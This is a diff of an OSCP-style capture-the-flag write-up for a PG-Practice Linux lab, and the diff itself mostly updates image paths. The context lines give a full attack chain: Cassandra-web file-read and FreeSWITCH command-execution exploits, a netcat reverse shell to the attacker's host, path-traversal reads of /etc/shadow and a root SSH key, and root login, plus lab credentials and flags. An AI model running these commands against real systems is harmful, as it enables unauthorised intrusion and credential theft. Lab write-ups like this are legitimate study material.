@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-17
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Linux
 Difficulty: Hard
@@ -91,70 +92,70 @@ Host script results:
 No enumeration conducted
 ## Port 80 - HTTP (Apache 2.4.38)
 - Navigated to `http://192.168.114.240:80` and identified `Apache/2.4.38'
-![[Pasted image 20241017193659.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017193659.png]]
 - Ran `gobuster dir -u http://192.168.114.240 -w //usr/share/dirb/wordlists/big.txt` to identify any available web directories - identified "backup" folder
-![[Pasted image 20241017200202.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017200202.png]]
 - Ran `gobuster dir -u http://192.168.114.240/backup -w //usr/share/dirb/wordlists/big.txt -x php,html,txt` to identify files in `backup`
-![[Pasted image 20241017202348.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017202348.png]]
 ## Port 139 & 445 - Netbios SSN (Samba 4.9.5-Debian)
 - Identified Samba 4.9.5: potentially vulnerable to CVE-2021-44142
 - Identified smb service, and ran `smbclient -L //192.168.114.240 -U guest` to connect as `guest` without a password and list all available shares - identified share `guest`
-![[Pasted image 20241017195423.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017195423.png]]
 - Ran `smbclient \\\\192.168.114.240\\backup` to connect to share `guest` as user `guest` and listed share contents with `ls`
-![[Pasted image 20241017203531.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017203531.png]]
 ## Port 3000 - HTTP (Thin httpd)
 - Navigated to `http://192.168.114.240:3000` and identified `Cassandra version 3.11.13`
-![[Pasted image 20241017194241.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017194241.png]]
 - Identified entry for `system_schema.keyspaces`
-![[Pasted image 20241017202047.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017202047.png]]
 - Identified entry for `system.local`
-![[Pasted image 20241017201839.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017201839.png]]
 - Identified entry for `system_schema.columns`
-![[Pasted image 20241017202250.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017202250.png]]
 - Identified potential exploit [49362](https://www.exploit-db.com/exploits/49362) and attempted file-read access on target machine with `python3 49362.py -p 3000 192.168.114.240 /etc/passwd` - identified users `cassie` and `anthony`
-![[Pasted image 20241017210233.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017210233.png]]
 - Ran exploit again with `python3 49362.py -p 3000 192.168.114.240 /proc/self/cmdline` to identify credentials `cassie:SecondBiteTheApple330`
-![[Pasted image 20241017211001.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017211001.png]]
 - Ran exploit again with `python3 49362.py -p 3000 192.168.114.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml` to identify `Freeswitch` password `StrongClueConEight021`
-![[Pasted image 20241017212201.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017212201.png]]
 ## Port 8021 - freeswitch
 - Ran NMap and identified `freeswitch` service running on port `8021`
 ---
 # Exploitation
 - Identified `freeswitch` potentially vulnerable to exploit [47799](https://www.exploit-db.com/exploits/47799) , saved locally as `freeswitch-exploit.py`
 	- Updated `freeswitch-exploit.py` to replace default password "ClueCon" with "StrongClueConEight021"
-![[Pasted image 20241017212354.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017212354.png]]
 - Saved `freeswitch-exploit.py` and ran `python3 freeswitch-exploit.py 192.168.114.240 whoami`
-![[Pasted image 20241017212609.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017212609.png]]
 - Started netcat listener on port `80`, then ran exploit again with `python3 freeswitch-exploit.py 192.168.114.240 'nc -c /bin/bash 192.168.45.154 80'` to establish reverse shell
-![[Pasted image 20241017214317.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017214317.png]]
 - Ran `find / -name local.txt -type f 2>/dev/null` to identify `local.txt`, and ran `cat /var/lib/freeswitch/local.txt` to print `6e79f3911c9a13321d9d94e2e621b593`
 ---
 # Lateral Movement to user
 - Ran `su cassie` with found password `SecondBiteTheApple330` to switch to user `cassie` 
-![[Pasted image 20241017214945.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017214945.png]]
 ---
 # Privilege Escalation
 ## Local Enumeration
 - Navigated to `/home/cassie`, identified `id_rsa` file and ran `cat id_rsa` to display SSH private key
-![[Pasted image 20241017215717.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017215717.png]]
 - Ran `ssh2john` to crack `cassie` RSA key - no password found
-![[Pasted image 20241017221006.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017221006.png]]
 - Ran `sudo -l` to identify `sudo` privileges
-![[Pasted image 20241017220245.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017220245.png]]
 ## Privilege Escalation vector
 - Ran `sudo /usr/local/bin/cassandra-web -B 0.0.0.0:4444 -u cassie -p SecondBiteTheApple330` to launch Cassandra server on localhost as `root`
-![[Pasted image 20241017222827.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017222827.png]]
 - Re-ran exploit `python3 freeswitch-exploit.py 192.168.114.240 'nc -c /bin/bash 192.168.45.154 80'` to establish 2nd reverse shell, then ran `curl --path-as-is localhost:4444/../../../../../../../../../etc/shadow` to display password hashes
-![[Pasted image 20241017222955.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017222955.png]]
 - Saved password hashes for `root` and `anthony` to `cluehash`
-![[Pasted image 20241017223413.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017223413.png]]
 - Ran `curl --path-as-is localhost:4444/../../../../../../../../../home/anthony/.bash_history` to view `anthony` bash history
-![[Pasted image 20241017224212.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017224212.png]]
 - Identified `root` RSA key has been copied to `/home/anthony/.ssh/id_rsa` - ran `curl --path-as-is localhost:4444/../../../../../../../../../home/anthony/.ssh/id_rsa` to display `root` RSA private key
-![[Pasted image 20241017224304.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017224304.png]]
 - Copied `root` RSA private key to local file `root_rsa` and logged into `root` user with `ssh -i root_rsa root@192.168.114.240`
-![[Pasted image 20241017224610.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241017224610.png]]
 - Ran `cat /root/proof.txt` and printed `The proof is in another file`
 - Listed directory contents and identified `proof_youtriedharder.txt` - ran `cat proof_youtriedharder.txt` to print `85cf69abf0ad2cced9e676fdeeef3702`
 ---
